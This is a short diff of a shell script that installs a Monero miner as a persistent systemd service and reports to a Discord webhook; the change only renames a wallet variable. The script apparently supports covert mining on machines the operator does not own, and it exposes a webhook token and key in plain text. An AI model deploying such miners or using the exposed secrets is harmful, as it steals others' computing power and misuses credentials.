@@ -5,7 +5,7 @@
 
 
 # ========== CONFIG ==========
-WALLET2="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # ⚠️ Thay ví của bạn vào đây
+WALLET="476tLSg94aUD7heHruXj87Ps2aJcauEBj9jQEuBp4cBsgxTaKrhfgHiLnGxo9jocM5A1ejJGiJz2NjVi4VehM8Ky7fQmNY8"  # ⚠️ Thay ví của bạn vào đây
 POOL="pool.hashvault.pro:443"
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1362712368441852015/UzYhxkLkAvkZm1IA8oy769N-PLfPJakT9OWe9wr2SCmNWVL0842CABegDTEI4rT5K9os"
 KEY="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
@@ -78,7 +78,7 @@ Description=Core Miner Daemon 2
 After=network.target
 
 [Service]
-ExecStart=$DIR2/$NAME2 -o $POOL -u $WALLET2.$WORKER2 -k --coin monero --tls \\
+ExecStart=$DIR2/$NAME2 -o $POOL -u $WALLET.$WORKER2 -k --coin monero --tls \\
   --cpu-priority=$PRIORITY --threads=$THREADS2 --donate-level=0 \\
   --max-cpu-usage=65 --log-file=$LOG2
 Restart=always
